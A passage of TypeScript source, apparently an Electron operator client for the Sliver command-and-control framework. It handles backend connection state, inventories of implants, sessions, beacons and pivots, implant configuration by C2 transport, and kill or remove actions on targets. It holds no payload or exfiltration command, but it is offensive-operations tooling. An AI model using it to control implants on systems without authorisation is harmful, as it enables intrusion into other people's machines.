    if (claim?.ownerWindowId === ownerWindowId && claim.requestId === requestId) claim.recoverable = false;
  }

  taskClaimForWindow(taskId: string, beaconId: string, ownerWindowId: number): PoolTaskClaim | undefined {
    this.pruneTaskClaims(this.now());
    const claim = this.taskClaims.get(taskId);
    return claim?.ownerWindowId === ownerWindowId && claim.beaconId === beaconId
      ? { ...claim }
      : undefined;
  }

  recoverableTaskIdsForBeacon(beaconId: string): string[] {
    this.pruneTaskClaims(this.now());
    return [...this.taskClaims.entries()].flatMap(([taskId, claim]) =>
      claim.recoverable && claim.beaconId === beaconId ? [taskId] : []
    );
  }

  private pruneTaskClaims(now: number): void {
    for (const [claimedTaskId, claim] of this.taskClaims) {
      if (claim.claimedAt + POOL_TASK_CLAIM_TTL_MS <= now) this.taskClaims.delete(claimedTaskId);
    }
  }

  private pruneSettledInvisibleTaskClaims(): void {
    if (this.taskClaims.size + this.taskClaimReservations.size < MAX_POOL_TASK_CLAIMS) return;
    for (const [taskId, claim] of this.taskClaims) {
      if (!claim.recoverable && !this.beaconTasks.containsTask(claim.beaconId, taskId)) {
        this.taskClaims.delete(taskId);
      }
      if (this.taskClaims.size + this.taskClaimReservations.size < MAX_POOL_TASK_CLAIMS) return;
    }
    // A visible, terminal task may outlive this bounded attribution journal.
    // Prefer an honest unknown-origin label for that old history over rejecting
    // a new operation before it can be dispatched. Recoverable claims are
    // never evicted here.
    for (const [taskId, claim] of this.taskClaims) {
      if (!claim.recoverable) this.taskClaims.delete(taskId);
      if (this.taskClaims.size + this.taskClaimReservations.size < MAX_POOL_TASK_CLAIMS) return;
    }
  }

  connect(): Promise<void> {
    if (["connected", "degraded", "reconnecting"].includes(this.snapshot.connection.status)) return Promise.resolve();
    if (this.connectPromise) return this.connectPromise;
    this.connectPromise = this.connectInternal().finally(() => {
      this.connectPromise = undefined;
    });
    return this.connectPromise;
  }

  private async connectInternal(): Promise<void> {
    await abortable(this.client.connect(), this.lifetime.signal);
    const version = await abortable(this.client.getVersion(), this.lifetime.signal);
    this.assertCurrent();
    const negotiated = negotiateServerVersion(version);
    this.compatibility = negotiated.compatibility;
    const versionText = `${version.Major}.${version.Minor}.${version.Patch}${version.Dirty ? " (dirty)" : ""}`;
    const capabilities = {
      compatibility: negotiated.compatibility,
      baselineCommit: SLIVER_PROTOCOL_BASELINE_COMMIT,
      serverVersion: versionText,
      ...(negotiated.reason ? { reason: negotiated.reason } : {}),
      currentSlice: {
        jobs: negotiated.compatibility !== "unsupported",
        listeners: negotiated.compatibility !== "unsupported",
        generation: negotiated.compatibility !== "unsupported",
        builds: negotiated.compatibility !== "unsupported",
        profiles: negotiated.compatibility !== "unsupported",
        events: negotiated.compatibility !== "unsupported",
        targets: negotiated.compatibility !== "unsupported",
        tasks: negotiated.compatibility !== "unsupported",
      },
    } as const;
    this.snapshot = {
      ...this.snapshot,
      connection: {
        ...this.snapshot.connection,
        status:
          negotiated.compatibility === "unsupported"
            ? "incompatible"
            : negotiated.compatibility === "degraded"
              ? "degraded"
              : "connected",
        version: versionText,
        capabilities,
        ...(negotiated.reason ? { error: negotiated.reason } : {}),
      },
    };
    this.onSnapshot(this.snapshot);
    if (negotiated.compatibility === "unsupported") {
      this.markDomainsUnsupported(negotiated.reason ?? "The connected server is unsupported");
      throw new Error(negotiated.reason ?? `Sliver ${versionText} is incompatible`);
    }
    this.subscribe();
    await this.refreshAll().catch(() => undefined);
    this.assertCurrent();
    this.reconcileTimer = setInterval(
      () => this.runBackgroundRefresh(["jobs", "builds", "profiles", "compiler", "sessions", "beacons", "operators", "builders", "crackstations"], false),
      RECONCILE_INTERVAL_MS,
    );
    this.reconcileTimer.unref();
  }

  async close(): Promise<void> {
    if (this.closed) return;
    this.closed = true;
    this.lifetime.abort(new Error("Backend connection closed"));
    if (this.reconcileTimer) clearInterval(this.reconcileTimer);
    if (this.watchTimer) clearInterval(this.watchTimer);
    if (this.invalidationTimer) clearTimeout(this.invalidationTimer);
    this.taskClaims.clear();
    this.executionTaskFacts.clear();
    this.taskClaimReservations.clear();
    this.beaconTasks.clear();
    this.networkForwarding.dispose();
    for (const subscription of this.subscriptions) subscription.unsubscribe();
    this.subscriptions.length = 0;
    await this.client.disconnect();
  }

  async refreshAll(): Promise<void> {
    return this.refreshDomains(["jobs", "builds", "profiles", "compiler", "sessions", "beacons", "operators", "pivots", "builders", "crackstations"]);
  }

  async refreshDomains(domains: readonly DomainName[], showLoading = true): Promise<void> {
    this.assertCurrent();
    const unique = [...new Set(domains)];
    const results = await Promise.allSettled(unique.map((domain) => this.refreshDomain(domain, showLoading)));
    this.assertCurrent();
    // Optional display metadata retains its own error/health state without
    // invalidating successful authoritative inventories.
    const failures = results.filter((result, index): result is PromiseRejectedResult =>
      result.status === "rejected" && !["pivots", "builders", "crackstations"].includes(unique[index]!));
    if (failures.length > 0) {
      this.setHealth("degraded", boundedText(errorMessage(failures[0]!.reason), MAX_SUMMARY_TEXT));
      throw new AggregateError(failures.map((failure) => failure.reason), "One or more Sliver state domains failed to refresh");
    }
    if (this.snapshot.eventStream.status === "retrying") {
      this.setHealth("reconnecting", this.snapshot.eventStream.error);
      return;
    }
    const health = this.settledHealth();
    this.setHealth(health.status, health.error);
  }

  private refreshDomain(domain: DomainName, showLoading: boolean): Promise<void> {
    const existing = this.refreshPromises.get(domain);
    if (existing) {
      // This caller's authoritative read intent occurred after the in-flight
      // request began, so require one serialized rerun before resolving it.
      this.refreshReruns.add(domain);
      if (showLoading) {
        this.refreshRerunLoading.add(domain);
        this.markDomainLoading(domain);
      }
      return existing;
    }
    const refresh = this.refreshDomainUntilClean(domain, showLoading).finally(() => {
      if (this.refreshPromises.get(domain) === refresh) {
        this.refreshPromises.delete(domain);
        this.refreshRerunLoading.delete(domain);
      }
    });
    this.refreshPromises.set(domain, refresh);
    return refresh;
  }

  private async refreshDomainUntilClean(domain: DomainName, showLoading: boolean): Promise<void> {
    while (true) {
      this.refreshReruns.delete(domain);
      try {
        await this.refreshDomainInternal(domain, showLoading);
      } catch (error) {
        if (!this.refreshReruns.delete(domain)) throw error;
        showLoading = this.refreshRerunLoading.delete(domain) || showLoading;
        continue;
      }
      if (!this.refreshReruns.delete(domain)) return;
      showLoading = this.refreshRerunLoading.delete(domain) || showLoading;
    }
  }

  private async refreshDomainInternal(domain: DomainName, showLoading: boolean): Promise<void> {
    if (showLoading) this.markDomainLoading(domain);
    try {
      switch (domain) {
        case "builders":
        case "crackstations": {
          const current = this.serviceInventory(domain);
          const supported = domain === "builders" ? this.client.getExternalBuilders : this.client.getCrackstations;
          if (!supported) {
            this.replaceServiceInventory(domain, { ...emptyServiceInventory(), status: "unsupported", revision: current.revision });
            break;
          }
          try {
            const normalized = domain === "builders"
              ? normalizeExternalBuilders(await abortable(this.client.getExternalBuilders!(), this.lifetime.signal))
              : normalizeCrackstations(await abortable(this.client.getCrackstations!(), this.lifetime.signal));
            this.assertCurrent();
            this.replaceServiceInventory(domain, {
              ...normalized, status: normalized.items.length ? "ready" : "empty",
              revision: current.revision + 1, updatedAt: new Date(this.now()).toISOString(),
            });
          } catch (error) {
            if (error && typeof error === "object" && "code" in error && error.code === 12) {
              this.assertCurrent();
              this.replaceServiceInventory(domain, { ...emptyServiceInventory(), status: "unsupported", revision: current.revision });
              break;
            }
            throw error;
          }
          break;
        }
        case "pivots": {
          if (!this.client.getPivotGraph) {
            this.replacePivotTopology({ status: "unsupported", revision: 0, entries: [], truncated: false });
            break;
          }
          try {
            const graph = await abortable(this.client.getPivotGraph(), this.lifetime.signal);
            this.assertCurrent();
            const normalized = normalizePivotTopology(graph);
            this.replacePivotTopology({
              ...normalized, status: normalized.entries.length ? "ready" : "empty",
              revision: (this.snapshot.pivotTopology?.revision ?? 0) + 1,
              updatedAt: new Date(this.now()).toISOString(),
            });
          } catch (error) {
            if (error && typeof error === "object" && "code" in error && error.code === 12) {
              this.assertCurrent();
              this.replacePivotTopology({ status: "unsupported", revision: 0, entries: [], truncated: false });
              break;
            }
            throw error;
          }
          break;
        }
        case "jobs": {
          const jobs = await abortable(this.client.jobs(), this.lifetime.signal);
          this.assertCurrent();
          this.commitJobs(jobs.map(jobSummary).sort((left, right) => left.id - right.id));
          break;
        }
        case "builds": {
          const builds = await abortable(this.client.implantBuilds(), this.lifetime.signal);
          this.assertCurrent();
          this.buildsByName.clear();
          for (const [name, config] of Object.entries(builds.Configs)) this.buildsByName.set(name, config);
          this.commitBuilds(
            Object.entries(builds.Configs)
              .map(([name, config]) => buildSummary(name, config, builds.staged[name] ?? false))
              .sort((left, right) => left.name.localeCompare(right.name)),
          );
          break;
        }
        case "profiles": {
          const profiles = await abortable(this.client.implantProfiles(), this.lifetime.signal);
          this.assertCurrent();
          this.profilesByName.clear();
          for (const profile of profiles.Profiles) this.profilesByName.set(profile.Name, profile);
          this.commitProfiles(
            profiles.Profiles.map(profileSummary).sort((left, right) => left.name.localeCompare(right.name)),
          );
          break;
        }
        case "compiler": {
          const compiler = await abortable(this.client.getCompiler(), this.lifetime.signal);
          this.assertCurrent();
          this.commitCompiler(compilerTargetSummaries(compiler));
          break;
        }
        case "sessions": {
          const sessions = await abortable(this.client.getSessions(), this.lifetime.signal);
          this.assertCurrent();
          for (const key of this.bofCapabilities.keys()) if (key.startsWith("session:")) this.bofCapabilities.delete(key);
          for (const session of sessions.Sessions) {
            let supported = false;
            try { supported = (BigInt(session.Capabilities ?? "0") & 1n) !== 0n; } catch { /* invalid capability is unavailable */ }
            this.bofCapabilities.set(`session:${session.ID}`, supported);
          }
          const committed = this.targetStore.replaceSessions(sessions.Sessions);
          this.replaceTargetDomains();
          if (committed.status === "error") throw new Error(committed.error ?? "Unable to normalize sessions inventory");
          break;
        }
        case "beacons": {
          const beacons = await abortable(this.client.getBeacons(), this.lifetime.signal);
          this.assertCurrent();
          for (const key of this.bofCapabilities.keys()) if (key.startsWith("beacon:")) this.bofCapabilities.delete(key);
          for (const beacon of beacons.Beacons) {
            let supported = false;
            try { supported = (BigInt(beacon.Capabilities ?? "0") & 1n) !== 0n; } catch { /* invalid capability is unavailable */ }
            this.bofCapabilities.set(`beacon:${beacon.ID}`, supported);
          }
          const committed = this.targetStore.replaceBeacons(beacons.Beacons);
          this.replaceTargetDomains();
          if (committed.status === "error") throw new Error(committed.error ?? "Unable to normalize beacons inventory");
          this.pruneExecutionTaskFacts();
          this.beaconTasks.pruneAbsentBeacons(this.targetStore.catalogIds("beacon"));
          break;
        }
        case "operators": {
          const operators = await abortable(this.client.getOperators(), this.lifetime.signal);
          this.assertCurrent();
          const committed = this.targetStore.replaceOperators(operators.Operators);
          this.replaceTargetDomains();
          if (committed.status === "error") throw new Error(committed.error ?? "Unable to normalize operator inventory");
          break;
        }
      }
    } catch (error) {
      if (!this.closed) this.markDomainError(domain, errorMessage(error));
      throw error;
    }
  }

  private markDomainLoading(domain: DomainName): void {
    switch (domain) {
      case "builders":
      case "crackstations":
        this.replaceServiceInventory(domain, loadingDomain(this.serviceInventory(domain)));
        break;
      case "pivots":
        this.replacePivotTopology({ revision: 0, entries: [], truncated: false, ...this.snapshot.pivotTopology, status: "loading" });
        break;
      case "jobs":
        this.replaceDomains({ ...this.snapshot.domains, jobs: loadingDomain(this.snapshot.domains.jobs) });
        break;
      case "builds":
        this.replaceDomains({ ...this.snapshot.domains, builds: loadingDomain(this.snapshot.domains.builds) });
        break;
      case "profiles":
        this.replaceDomains({ ...this.snapshot.domains, profiles: loadingDomain(this.snapshot.domains.profiles) });
        break;
      case "compiler":
        this.replaceDomains({ ...this.snapshot.domains, compiler: loadingDomain(this.snapshot.domains.compiler) });
        break;
      case "sessions":
      case "beacons":
      case "operators":
        this.targetStore.markLoading(domain);
        this.replaceTargetDomains();
        break;
    }
  }

  private markDomainError(domain: DomainName, error: string): void {
    const safeError = boundedText(error, MAX_SUMMARY_TEXT);
    switch (domain) {
      case "builders":
      case "crackstations":
        this.replaceServiceInventory(domain, domainWithStatus(this.serviceInventory(domain), "error", safeError));
        break;
      case "pivots":
        this.replacePivotTopology({ revision: 0, entries: [], truncated: false, ...this.snapshot.pivotTopology, status: "error", error: safeError });
        break;
      case "jobs":
        this.replaceDomains({ ...this.snapshot.domains, jobs: domainWithStatus(this.snapshot.domains.jobs, "error", safeError) });
        break;
      case "builds":
        this.replaceDomains({ ...this.snapshot.domains, builds: domainWithStatus(this.snapshot.domains.builds, "error", safeError) });
        break;
      case "profiles":
        this.replaceDomains({ ...this.snapshot.domains, profiles: domainWithStatus(this.snapshot.domains.profiles, "error", safeError) });
        break;
      case "compiler":
        this.replaceDomains({ ...this.snapshot.domains, compiler: domainWithStatus(this.snapshot.domains.compiler, "error", safeError) });
        break;
      case "sessions":
      case "beacons":
      case "operators":
        this.targetStore.markError(domain, safeError);
        this.replaceTargetDomains();
        break;
    }
  }

  private commitJobs(items: JobSummary[]): void {
    this.replaceDomains({ ...this.snapshot.domains, jobs: committedDomain(this.snapshot.domains.jobs, items) });
  }

  private replacePivotTopology(pivotTopology: PivotTopologySnapshot): void {
    this.snapshot = { ...this.snapshot, pivotTopology };
    this.onSnapshot(this.snapshot);
  }

  private serviceInventory(domain: ServiceDomainName): DomainCollection<InfrastructureServiceSummary> {
    return this.snapshot.infrastructureServices?.[domain] ?? emptyServiceInventory();
  }

  private replaceServiceInventory(domain: ServiceDomainName, inventory: DomainCollection<InfrastructureServiceSummary>): void {
    this.snapshot = {
      ...this.snapshot,
      infrastructureServices: {
        builders: this.serviceInventory("builders"),
        crackstations: this.serviceInventory("crackstations"),
        [domain]: inventory,
      },
    };
    this.onSnapshot(this.snapshot);
  }

  private commitBuilds(items: BuildSummary[]): void {
    this.replaceDomains({ ...this.snapshot.domains, builds: committedDomain(this.snapshot.domains.builds, items) });
  }

  private commitProfiles(items: ProfileSummary[]): void {
    this.replaceDomains({ ...this.snapshot.domains, profiles: committedDomain(this.snapshot.domains.profiles, items) });
  }

  private commitCompiler(items: CompilerTargetSummary[]): void {
    this.replaceDomains({ ...this.snapshot.domains, compiler: committedDomain(this.snapshot.domains.compiler, items) });
  }

  private markDomainsUnsupported(error: string): void {
    const safeError = boundedText(error, MAX_SUMMARY_TEXT);
    const targetDomains = this.targetStore.markUnsupported(safeError);
    this.replaceDomains({
      jobs: domainWithStatus(this.snapshot.domains.jobs, "unsupported", safeError),
      builds: domainWithStatus(this.snapshot.domains.builds, "unsupported", safeError),
      profiles: domainWithStatus(this.snapshot.domains.profiles, "unsupported", safeError),
      compiler: domainWithStatus(this.snapshot.domains.compiler, "unsupported", safeError),
      ...targetDomains,
    });
  }

  private replaceDomains(domains: SliverSnapshot["domains"]): void {
    this.snapshot = {
      ...this.snapshot,
      domains,
      jobs: domains.jobs.items,
      builds: domains.builds.items,
      profiles: domains.profiles.items,
      compilerTargets: domains.compiler.items,
      sessions: domains.sessions.items,
      beacons: domains.beacons.items,
      operators: domains.operators.items,
      recentEvents: this.recentEvents,
      lastUpdated: new Date().toISOString(),
    };
    this.onSnapshot(this.snapshot);
  }

  private replaceTargetDomains(): void {
    this.replaceDomains({ ...this.snapshot.domains, ...this.targetStore.snapshot() });
  }

  profile(name: string): clientpb.ImplantProfile {
    const normalized = requireKnownName(name, "Profile name");
    const profile = this.profilesByName.get(normalized);
    if (!profile) throw new Error(`Unknown profile '${normalized}'`);
    return profile;
  }

  hasProfile(name: string): boolean {
    return this.profilesByName.has(name);
  }

  hasBuild(name: string): boolean {
    return this.buildsByName.has(name);
  }

  implantConfigForTarget(target: TargetSummary): clientpb.ImplantConfig {
    const retained = this.buildsByName.get(target.name) ?? this.buildsByName.get(target.id);
    if (retained) return clientpb.ImplantConfig.create(retained);
    const activeC2 = this.targetStore.authoritativeActiveC2(target.mode, target.id);
    if (!activeC2) throw new Error("The selected target has no authoritative active C2 configuration");
    const scheme = /^([a-z][a-z0-9+.-]*):/iu.exec(activeC2)?.[1]?.toLowerCase() ?? "";
    return clientpb.ImplantConfig.create({
      IsBeacon: target.mode === "beacon",
      GOOS: target.os.toLowerCase(),
      GOARCH: target.arch.toLowerCase(),
      IncludeMTLS: scheme === "mtls",
      IncludeHTTP: scheme === "http" || scheme === "https",
      IncludeWG: scheme === "wg",
      IncludeDNS: scheme === "dns",
      IncludeNamePipe: scheme === "namedpipe",
      IncludeTCP: scheme === "tcppivot",
      C2: [clientpb.ImplantC2.create({ URL: activeC2 })],
      HTTPC2ConfigName: "default",
    });
  }

  assertCompilerTarget(input: GenerateInput): void {
    if (this.snapshot.domains.compiler.status !== "ready") {
      throw new Error("Compiler targets are not currently authoritative; refresh the compiler inventory before generating");
    }
    const os = input.os.trim().toLowerCase();
    const arch = input.arch.trim().toLowerCase();
    const match = this.snapshot.compilerTargets.find(
      (target) => target.os === os && target.arch === arch && target.format === input.format,
    );
    if (!match) throw new Error(`The server cannot build ${input.format} for ${os}/${arch}`);
  }

  private subscribe(): void {
    this.subscriptions.push(
      this.client.event$.subscribe({
        next: (event) => {
          if (this.recentEventDeduplicator.shouldRecord(event)) {
            this.recentEvents = [summarizeEvent(event), ...this.recentEvents].slice(0, MAX_RECENT_EVENTS);
            this.snapshot = { ...this.snapshot, recentEvents: this.recentEvents };
            this.onSnapshot(this.snapshot);
          }
          const domains = invalidatedDomainsForEvent(event.EventType);
          if (domains.length > 0) this.scheduleInvalidation(domains);
          if (event.EventType.toLowerCase() === "beacon-taskresult") this.onTaskSignal("server-event");
        },
        error: (error: unknown) => this.markEventStreamFailure(error),
      }),
      this.client.eventStreamState$.subscribe({
        next: (state) => {
          const recovered = this.previousEventStatus === "retrying" && state.status === "connected";
          const wasOnline = ["connected", "degraded", "reconnecting"].includes(this.snapshot.connection.status);
          this.previousEventStatus = state.status;
          const eventStream = {
            status: state.status,
            attempt: state.attempt,
            ...(state.error ? { error: errorMessage(new Error(state.error)) } : {}),
          };
          let connectionStatus = this.snapshot.connection.status;
          if (state.status === "retrying") connectionStatus = "reconnecting";
          else if (state.status === "stopped" && wasOnline) connectionStatus = "degraded";
          this.snapshot = {
            ...this.snapshot,
            eventStream,
            connection: { ...this.snapshot.connection, status: connectionStatus },
          };
          this.onSnapshot(this.snapshot);
          if (state.status === "retrying") this.onTaskSignal("connection-interrupted");
          if (recovered) {
            this.scheduleInvalidation(["jobs", "builds", "profiles", "compiler", "sessions", "beacons", "operators", "builders", "crackstations"], 0);
            this.onTaskSignal("reconnect");
          }
        },
        error: (error: unknown) => this.markEventStreamFailure(error),
      }),
    );
  }

  private scheduleInvalidation(domains: readonly DomainName[], delayMs = 100): void {
    for (const domain of domains) {
      this.pendingInvalidations.add(domain);
      if (this.refreshPromises.has(domain)) this.refreshReruns.add(domain);
    }
    if (this.invalidationTimer) clearTimeout(this.invalidationTimer);
    this.invalidationTimer = setTimeout(() => {
      const pending = [...this.pendingInvalidations];
      this.pendingInvalidations.clear();
      this.runBackgroundRefresh(pending);
    }, delayMs);
    this.invalidationTimer.unref();
  }

  private runBackgroundRefresh(domains: readonly DomainName[], showLoading = true): void {
    const inventories = domains.includes("sessions") ? [...domains, "pivots" as const] : domains;
    // A scheduled poll does not invalidate its last settled inventory. Keep
    // event-driven and explicit refreshes marked as loading for action gates.
    void this.refreshDomains(inventories, showLoading).catch(() => undefined);
  }

  private markEventStreamFailure(error: unknown): void {
    const safeError = errorMessage(error);
    this.snapshot = {
      ...this.snapshot,
      eventStream: {
        ...this.snapshot.eventStream,
        status: "stopped",
        error: safeError,
      },
    };
    this.setHealth("degraded", safeError);
  }

  private setHealth(status: "connected" | "degraded" | "reconnecting", error?: string): void {
    if (this.closed || this.snapshot.connection.status === "incompatible") return;
    const connection = { ...this.snapshot.connection, status };
    if (error) connection.error = error;
    else delete connection.error;
    this.snapshot = {
      ...this.snapshot,
      connection,
    };
    this.onSnapshot(this.snapshot);
  }

  private settledHealth(): { status: "connected" | "degraded"; error?: string } {
    if (this.snapshot.eventStream.status === "stopped") {
      return {
        status: "degraded",
        error: this.snapshot.eventStream.error ?? "The server event stream is stopped",
      };
    }
    if (this.snapshot.pivotTopology?.error || this.snapshot.pivotTopology?.status === "error") {
      return { status: "degraded", error: this.snapshot.pivotTopology.error ?? "Pivot topology could not be refreshed" };
    }
    const failedService = Object.values(this.snapshot.infrastructureServices ?? {}).find((domain) => Boolean(domain.error));
    if (failedService) return { status: "degraded", error: failedService.error ?? "Infrastructure services could not be refreshed" };
    const failedDomain = Object.values(this.snapshot.domains).find((domain) => Boolean(domain.error));
    if (failedDomain) {
      return {
        status: "degraded",
        error: failedDomain.error ?? "One or more Sliver state domains failed to refresh",
      };
    }
    if (this.compatibility === "degraded") {
      return {
        status: "degraded",
        ...(this.snapshot.connection.capabilities?.reason
          ? { error: this.snapshot.connection.capabilities.reason }
          : {}),
      };
    }
    return { status: "connected" };
  }

  private assertCurrent(): void {
    if (this.closed || this.lifetime.signal.aborted) throw new Error("Stale backend connection epoch");
  }
}

function closeWindowOperationEngine(context: WindowContext): void {
  if (context.operationReconcileTimer) clearInterval(context.operationReconcileTimer);
  context.operationEngine?.close();
  delete context.operationEngine;
  delete context.operationPoolKey;
  delete context.operationReconcileTimer;
  delete context.operationReconcileInFlight;
  delete context.operationReconcilePending;
  delete context.operationReconcileIncludeOutcomeUnknown;
  delete context.operationReconcilePendingReason;
}

function sameTargetRefIdentity(left: TargetRef, right: TargetRef): boolean {
  return left.mode === right.mode &&
    left.id === right.id &&
    left.backendEpoch === right.backendEpoch &&
    left.fingerprint === right.fingerprint;
}

function processExecutionHistoryKey(poolKey: string, epoch: number, target: TargetRef): string {
  return JSON.stringify([poolKey, epoch, target.mode, target.id, target.fingerprint]);
}

function processExecutionOutputBytes(record: ProcessExecutionRecord): number {
  return (record.stdout?.data.byteLength ?? 0) + (record.stderr?.data.byteLength ?? 0);
}

function clearProcessExecutionOutput(record: ProcessExecutionRecord): void {
  record.stdout?.data.fill(0);
  record.stderr?.data.fill(0);
}

function cloneProcessExecutionRecord(record: ProcessExecutionRecord): ProcessExecutionRecord {
  return {
    ...record,
    args: [...record.args],
    ...(record.result ? { result: cloneExecutionActionResult(record.result) } : {}),
    ...(record.stdout ? {
      stdout: { data: Uint8Array.from(record.stdout.data), truncated: record.stdout.truncated },
    } : {}),
    ...(record.stderr ? {
      stderr: { data: Uint8Array.from(record.stderr.data), truncated: record.stderr.truncated },
    } : {}),
  };
}

function dotNetExecutionOutputBytes(record: DotNetExecutionRecord): number {
  return (record.stdout?.data.byteLength ?? 0) + (record.stderr?.data.byteLength ?? 0);
}

function clearDotNetExecutionOutput(record: DotNetExecutionRecord): void {
  record.stdout?.data.fill(0);
  record.stderr?.data.fill(0);
}

function cloneDotNetExecutionRecord(record: DotNetExecutionRecord): DotNetExecutionRecord {
  return {
    ...record,
    args: [...record.args],
    ...(record.result ? { result: cloneExecutionActionResult(record.result) } : {}),
    ...(record.stdout ? {
      stdout: { data: Uint8Array.from(record.stdout.data), truncated: record.stdout.truncated },
    } : {}),
    ...(record.stderr ? {
      stderr: { data: Uint8Array.from(record.stderr.data), truncated: record.stderr.truncated },
    } : {}),
  };
}

function streamOwnerBinding(
  context: WindowContext,
  pool: BackendPool,
  target: TargetRef,
  rendererProcessId: number,
  rendererFrameToken: string,
): StreamOwnerBinding {
  return {
    ownerWindowId: context.contentsId,
    rendererProcessId,
    rendererFrameToken,
    rendererDocumentId: createHash("sha256")
      .update(String(rendererProcessId))
      .update("\0")
      .update(rendererFrameToken)
      .digest("hex"),
    backendId: pool.key,
    backendEpoch: pool.epoch,
    connectionIncarnation: context.connectionAttempt,
    target,
  };
}

function electronStreamPort(port: MessagePortMain): StreamAttachmentPort {
  return {
    postMessage: (frame) => port.postMessage(frame),
    close: () => port.close(),
    onMessage: (listener) => {
      const handleMessage = (event: MessageEvent): void => listener(event.data);
      port.on("message", handleMessage);
      return () => port.off("message", handleMessage);
    },
    onClose: (listener) => {
      port.on("close", listener);
      return () => port.off("close", listener);
    },
    start: () => port.start(),
  };
}

function supportedTargetCapabilities(pool: BackendPool) {
  if (pool.snapshot.connection.capabilities?.currentSlice.targets !== true) return [];
  return TARGET_CAPABILITY_IDS.filter((capability) =>
    pool.snapshot.connection.capabilities?.currentSlice.tasks === true || !capability.startsWith("beacon.tasks."),
  );
}

function calculatePoolTargetCapabilities(pool: BackendPool, target: TargetSummary) {
  return calculateTargetCapabilities(
    target,
    { supported: supportedTargetCapabilities(pool) },
    { openSessionEndpointAvailable: isPoolOpenSessionEndpointAvailable(pool, target) },
  );
}

function isPoolOpenSessionEndpointAvailable(pool: BackendPool, target: TargetSummary): boolean {
  const authoritativeActiveC2 = pool.targetStore.authoritativeActiveC2(target.mode, target.id);
  return isAuthoritativeActiveC2Usable({
    summary: target,
    ...(authoritativeActiveC2 ? { authoritativeActiveC2 } : {}),
  });
}

function targetDomainAuthoritative(pool: BackendPool, mode: TargetRef["mode"]): boolean {
  const domain = mode === "session" ? pool.snapshot.domains.sessions : pool.snapshot.domains.beacons;
  return domain.status === "ready" || domain.status === "empty";
}

function targetDomainAbsenceAuthoritative(pool: BackendPool, mode: TargetRef["mode"]): boolean {
  // The bounded snapshot is only a projection. TargetStore retains the full
  // normalized domain committed by the authoritative server response, so a
  // target absent from that catalog is absent even when the projection pages.
  return targetDomainAuthoritative(pool, mode);
}

function assertTargetDomainAuthoritative(pool: BackendPool, mode: TargetRef["mode"]): void {
  if (!targetDomainAuthoritative(pool, mode)) {
    throw new Error(`The ${mode} inventory is not authoritative; refresh before acting`);
  }
}

function cloneBofRecord(record: BofExecutionRecord): BofExecutionRecord {
  return {
    ...record,
    ...(record.stdout ? { stdout: { data: Uint8Array.from(record.stdout.data), truncated: record.stdout.truncated } } : {}),
    ...(record.stderr ? { stderr: { data: Uint8Array.from(record.stderr.data), truncated: record.stderr.truncated } } : {}),
  };
}

function clearBofRecord(record: BofExecutionRecord): void {
  record.stdout?.data.fill(0);
  record.stderr?.data.fill(0);
}

function operationBackendSummary(context: WindowContext, pool: BackendPool) {
  return {
    configId: pool.key,
    configName: context.configName ?? "Current configuration",
    server: pool.snapshot.connection.server ?? "Unknown server",
    operator: pool.snapshot.connection.operator ?? "Unknown operator",
    epoch: pool.epoch,
  };
}

function allWindowOperations(engine: OperationEngine): TargetOperationRecord[] {
  const operations: TargetOperationRecord[] = [];
  let cursor: string | undefined;
  do {
    const page = engine.list({ ...(cursor ? { cursor } : {}), limit: 100 });
    operations.push(...page.items);
    cursor = page.page.nextCursor;
  } while (cursor);
  return operations;
}

function localTaskIdsForBeacon(context: WindowContext, beaconId: string): string[] {
  if (!context.operationEngine) return [];
  return allWindowOperations(context.operationEngine).flatMap((operation) =>
    operation.target.mode === "beacon" && operation.target.id === beaconId && operation.taskId
      ? [operation.taskId]
      : [],
  );
}

function taskClaimReservationKey(ownerWindowId: number, requestId: string): string {
  return `${ownerWindowId}:${requestId}`;
}

function requiresTaskReconciliation(operation: TargetOperationRecord): boolean {
  return Boolean(operation.taskId) && (
    !TERMINAL_OPERATION_STATES.has(operation.state) || operation.state === "outcome-unknown"
  );
}

function requiresActiveTaskPolling(operation: TargetOperationRecord): boolean {
  return Boolean(operation.taskId) && !TERMINAL_OPERATION_STATES.has(operation.state);
}

function mergeReconcileReason(
  current: BeaconTasksInvalidationReason | undefined,
  incoming: BeaconTasksInvalidationReason,
): BeaconTasksInvalidationReason {
  if (current === "reconnect" || incoming === "reconnect") return "reconnect";
  if (current === "server-event" || incoming === "server-event") return "server-event";
  return incoming;
}

function reconcileIncludesOutcomeUnknown(context: WindowContext): boolean {
  return context.operationReconcileIncludeOutcomeUnknown === true;
}

function targetActionDomains(
  actionId: DestructiveTargetActionId,
  context: WindowContext,
): Array<"sessions" | "beacons"> {
  switch (actionId) {
    case "target.kill":
      if (!context.activeTarget) throw new Error("Select a target before preparing this action");
      return [context.activeTarget.mode === "session" ? "sessions" : "beacons"];
    case "session.close":
    case "sessions.prune-dead":
      return ["sessions"];
    case "beacon.remove":
    case "beacons.prune-overdue":
      return ["beacons"];
  }
}

function targetBackendSummary(context: WindowContext, pool: BackendPool) {
  return {
    server: pool.snapshot.connection.server ?? "Unknown server",
    operator: pool.snapshot.connection.operator ?? "Unknown operator",
    configName: context.configName ?? "Current configuration",
    epoch: pool.epoch,
    sharedWindowCount: pool.windowCount,
  };
}

function targetActionWarning(actionId: DestructiveTargetActionId): string {
  switch (actionId) {
    case "target.kill":
      return "For sessions, the server removes the session and submits a kill request but cannot prove the remote process exited. For beacons, Sliver does not return a task ID, so delivery remains outcome unknown.";
    case "session.close":
      return "This closes the interactive connection without killing the remote process.";
    case "beacon.remove":
      return "This deletes the server beacon record and its stored tasks. It does not kill the implant, which may register again.";
    case "sessions.prune-dead":
      return "Only the exact dead sessions listed here will be removed. No server-wide clean command is used.";
    case "beacons.prune-overdue":
      return "Only the exact overdue beacons listed here and their stored tasks will be removed. A still-running implant may register again.";
  }
}

async function executeTargetAction(
  client: SliverClientAdapter,
  actionId: DestructiveTargetActionId,
  target: TargetSummary,
): Promise<"succeeded" | "outcome-unknown"> {
  switch (actionId) {
    case "target.kill":
      if (target.mode === "session") {
        await client.killSession(target.id, false);
        return "succeeded";
      }
      await client.killBeacon(target.id, false);
      return "outcome-unknown";
    case "session.close":
      if (target.mode !== "session") throw new Error("The reviewed target is not a session");
      await client.closeSession(target.id);
      return "succeeded";
    case "beacon.remove":
    case "beacons.prune-overdue":
      if (target.mode !== "beacon") throw new Error("The reviewed target is not a beacon");
      await client.rmBeacon(target.id);
      return "succeeded";
    case "sessions.prune-dead":
      if (target.mode !== "session") throw new Error("The reviewed target is not a session");
      await client.killSession(target.id, false);
      return "succeeded";
  }
}

function targetActionRemovesResource(actionId: DestructiveTargetActionId, target: TargetSummary): boolean {
  switch (actionId) {
